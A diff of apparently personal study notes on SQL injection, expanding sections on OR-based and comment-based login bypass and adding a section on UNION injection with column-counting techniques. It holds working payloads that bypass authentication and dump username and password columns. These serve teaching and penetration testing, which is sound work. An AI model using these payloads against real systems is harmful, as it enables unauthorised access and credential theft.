@@ -23,7 +23,7 @@ SHOW DATABASES;
 ```
 ### Switch to Database
 ```
-Use database_name;
+USE database_name;
 ```
 ### View Tables
 ```
@@ -94,9 +94,13 @@ To test whether the login form is vulnerable to SQL injection, we can try to add
 ### OR Injection
 If there is at least one TRUE condition in the entire query along with an OR operator, the entire query will evaluate to TRUE.
 Potential payload at a login page:
-`admin' or '1'='1`
+```
+admin' or '1'='1
+```
 So the final query would be:
-`SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';`
+```
+SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
+```
 Find a comprehensive list of SQLi auth bypass payloads in [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass).
 If we don't know a valid username, we can put the same payload into the password fiels.
 ### Using Comments
@@ -104,9 +108,54 @@ We can use two types of line comments with MySQL `--` and `#`, in addition to an
 *Note: In SQL, using two dashes only is not enough to start a comment, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.*
 *Note: If you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.*
 Potential payload:
-`admin'--`
+```
+admin'--
+```
 The resulting query:
-`SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';`
-...
-
+```
+SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
+```
+### Union Clause
+Another type of SQL injection is injecting entire SQL queries executed along with the original query.
+The Union clause is used to combine results from multiple SELECT statements. This means that through a UNION injection, we will be able to SELECT and dump data from all across the DBMS, from multiple tables and databases.
+```
+SELECT * FROM ports UNION SELECT * FROM ships;
+```
+*Note: The data types of the selected columns on all positions should be the same.*
+*Note: A UNION statement can only operate on SELECT statements with an equal number of columns. For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.*
+Potentical payload:
+```
+1' UNION SELECT username, password from passwords-- '
+```
+The resulting query:
+```
+SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
+```
+If the original query used SELECT on a table with four columns, our UNION injection would be:
+```
+UNION SELECT username, 2, 3, 4 from passwords-- '
+```
+The resulting query:
+```
+SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '
+```
+#### Detect the Number of Columns
+##### Using ORDER BY
+We have to inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.
+Potential payload:
+```
+' order by 1-- -
+```
+And then increase the number.
+#### Using UNION
+Potentical payload:
+```
+cn' UNION select 1,2,3-- -
+```
+Then:
+```
+cn' UNION select 1,2,3,4-- -
+```
+*Note: It is very common that not every column will be displayed back to the user. This is the benefit of using numbers as our junk data, as it makes it easy to track which columns are printed, so we know at which column to place our query.*
+*Note: We can also use `@@version` in our SQL query in the place of a cloumn to get data from the database or `user()` to get data about the user, etc.*
 
